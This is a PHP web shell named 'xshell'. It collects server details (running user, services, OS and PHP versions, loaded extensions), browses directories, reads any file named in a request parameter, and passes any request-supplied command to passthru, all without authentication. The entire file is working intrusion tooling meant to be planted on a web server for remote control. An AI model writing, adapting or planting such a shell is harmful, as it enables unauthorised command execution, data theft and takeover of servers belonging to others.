<?php
    /*
     * xshell 
     */

    /* Gather information about the server */
    /* Find out who we are */
    //var_dump($_SERVER);
    $USER = posix_getpwuid(posix_geteuid());
    /*echo "I am {$USER['name']}<br />";
    echo "Document root: {$_SERVER['DOCUMENT_ROOT']}<br />";
    echo "My permissions in current directory: " . substr(sprintf('%o', fileperms($_SERVER['DOCUMENT_ROOT'])));*/
    clearstatcache();
    
    if (isset($_REQUEST['ajax']))
    {
        /* Handle an ajax request */
        if ($_REQUEST['ajax'] == 'info')
        {
            /* Assemble the appropriate data */
            /* User */
            $processUser = posix_getpwuid(posix_geteuid());
            /* Services */
            passthru('service --status-all');
            $_services = str_replace("\r", '', ob_get_clean()); // Remove output from buffer
            $_services = explode("\n", $_services);
            foreach ($_services as $s)
            {
                if (@$s[3] == '+')
                {
                    $services[] = substr($s, 8);
                }
            }
            foreach ($_services as $s)
            {
                if (@$s[3] != '+')
                {
                    $services[] = substr($s, 8);
                }
            }
            /* Free space */
            //passthru('df ' . $_SERVER['DOCUMENT_ROOT'] . ' -P');
            $free_space = ob_get_clean();

            /* JSON-encode it */
            $ret = array(
                'server_software' => $_SERVER['SERVER_SOFTWARE'],
                'php_uname' => php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname ('v'),
                'user' => $processUser['name'],
                'filename' => $_SERVER['SCRIPT_FILENAME'],
                'document_root' => $_SERVER['DOCUMENT_ROOT'],
                'free_space' => $free_space,
                'services' => $services,
                'php_version' => PHP_VERSION,
                'system' => php_uname('a'),
                'extensions' => get_loaded_extensions()
            );
            echo json_encode($ret);
        }
        if ($_REQUEST['ajax'] == 'dir')
        {
            $dir = realpath(realpath($_REQUEST['dir']) . DIRECTORY_SEPARATOR . @$_REQUEST['go']);
            $ret['dir'] = $dir;
            $files = scandir($dir);
            foreach ($files as $file)
            {
                if (is_dir(realpath($dir . DIRECTORY_SEPARATOR . $file)))
                {
                    $ret['dirs'][] = $file;
                }
                else
                {
                    $ret['files'][] = $file;
                }
            }
            echo json_encode($ret);
        }
        if ($_REQUEST['ajax'] == 'get')
        {
            echo file_get_contents($_REQUEST['get']);
        }
        if ($_REQUEST['ajax'] == 'passthru')
        {
            passthru($_REQUEST['passthru']);
            $output = ob_get_clean();
            $ret['output'] = $output;
            $ret['cwd'] = getcwd();
            echo json_encode($ret);
        }
        die();
    }
    else
    {
        include('template.html');
    }
?>